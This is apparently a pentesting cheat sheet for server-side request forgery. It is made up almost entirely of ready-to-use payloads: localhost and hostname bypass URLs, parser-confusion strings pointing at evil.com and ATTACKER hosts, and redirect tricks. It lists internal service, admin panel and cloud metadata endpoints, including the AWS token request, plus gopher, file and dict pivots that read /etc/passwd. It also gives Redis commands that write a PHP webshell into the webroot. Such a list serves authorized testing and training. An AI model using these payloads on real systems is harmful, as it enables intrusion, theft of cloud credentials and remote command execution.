# SSRF

## Basics

```text
protocol://username:password@host:port/path?query#fragment
```

## Try

```text
http://127.0.0.1/
http://localhost/
http://[::1]/
http://169.254.169.254/latest/meta-data/
```

## Localhost Bypass

```text
http://127.1/
http://0/
http://0.0.0.0/
http://2130706433/
http://017700000001/
http://0x7f000001/
http://127.127.127.127/
http://[::ffff:127.0.0.1]/
http://localhost./
http://LOCALHOST/
```

## Hostname Bypass

```text
http://internal./
http://localhost./
http://127.0.0.1./
http://allowed.com./
http://allowed.com..ATTACKER/
http://allowed.com%2eATTACKER/
http://allowed.com%00.ATTACKER/
http://LOCALHOST/
http://LocalHost/
```

Trailing-dot hostnames are useful when validation blocks `internal` but the resolver still accepts `internal.`.

## Parser Confusion

```text
http://127.0.0.1@evil.com/
http://evil.com#@127.0.0.1/
http://evil.com\@127.0.0.1/
http://127.0.0.1%5c@evil.com/
http://127.1.1.1:80\@127.2.2.2:80/
http://127.1.1.1:80\@@127.2.2.2:80/
http://127.1.1.1:80:\@@127.2.2.2:80/
http://127.1.1.1:80#\@127.2.2.2:80/
```

## Redirect Bypass

```text
https://307.r3dir.me/--to/?url=http://localhost
https://trusted.example.com/redirect?next=http://127.0.0.1/admin
```

Test 301, 302, 303, 307, and 308 separately.

## Internal Targets

```text
http://127.0.0.1:80/
http://127.0.0.1:3000/admin
http://127.0.0.1:5000/debug
http://127.0.0.1:8000/openapi.json
http://127.0.0.1:8080/actuator/env
http://127.0.0.1:2375/version
http://127.0.0.1:6379/
http://127.0.0.1:11211/
```

## Cloud Metadata

```http
PUT http://169.254.169.254/latest/api/token
X-aws-ec2-metadata-token-ttl-seconds: 21600

GET http://169.254.169.254/latest/meta-data/
X-aws-ec2-metadata-token: <token>
```

```text
http://metadata.google.internal/computeMetadata/v1/
http://169.254.169.254/metadata/instance?api-version=2021-02-01
```

## Protocol Pivots

```text
gopher://127.0.0.1:80/_GET%20/admin%20HTTP/1.1%0d%0aHost:%20localhost%0d%0a%0d%0a
file:///etc/passwd
dict://127.0.0.1:6379/info
php://filter/convert.base64-encode/resource=/flag.txt
```

## Redis via gopher

```text
gopher://127.0.0.1:6379/_%2a1%0d%0a%244%0d%0aINFO%0d%0a
```

Write webshell when Redis can write into webroot:

```text
CONFIG SET dir /var/www/html
CONFIG SET dbfilename shell.php
SET x "<?php system($_GET[0]); ?>"
SAVE
```

## PHP-FPM / FastCGI

```text
127.0.0.1:9000
/var/run/php/php-fpm.sock
/run/php/php-fpm.sock
```

Use `gopherus` or `fastcgi_param SCRIPT_FILENAME /var/www/html/index.php` payloads.

## Admin Panels

```text
http://127.0.0.1:9200/_cat/indices
http://127.0.0.1:8983/solr/admin/cores
http://127.0.0.1:15672/
http://127.0.0.1:8080/actuator/env
http://127.0.0.1:5000/console
```

## Docker / Compose

```text
http://internal:5001/
http://api:8080/actuator/env
http://redis:6379/
http://db:5432/
http://host.docker.internal:5001/
http://172.17.0.1:5001/
http://SERVICE:PORT/
http://PROJECT-SERVICE-1:PORT/
```

## Blind SSRF

1. Fire DNS/HTTP callback first.
2. DNS-only: test parser bypasses, redirects, and internal ports by timing.
3. HTTP callback: pivot to open redirect, gopher, or second sink.
4. Common second sinks: preview, import URL, webhook, PDF/HTML converter.

## Domain Redirect

| Domain | Redirect To |
| --- | --- |
| localtest.me | `::1` |
| localh.st | `127.0.0.1` |
| spoofed.[BURP_COLLABORATOR] | `127.0.0.1` |
| spoofed.redacted.oastify.com | `127.0.0.1` |
| company.127.0.0.1.nip.io | `127.0.0.1` |

## Useful Links

* [https://highon.coffee/blog/ssrf-cheat-sheet/](https://highon.coffee/blog/ssrf-cheat-sheet/)
* [https://hacktricks.boitatech.com.br/pentesting-web/ssrf-server-side-request-forgery](https://hacktricks.boitatech.com.br/pentesting-web/ssrf-server-side-request-forgery)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)
* [https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf)
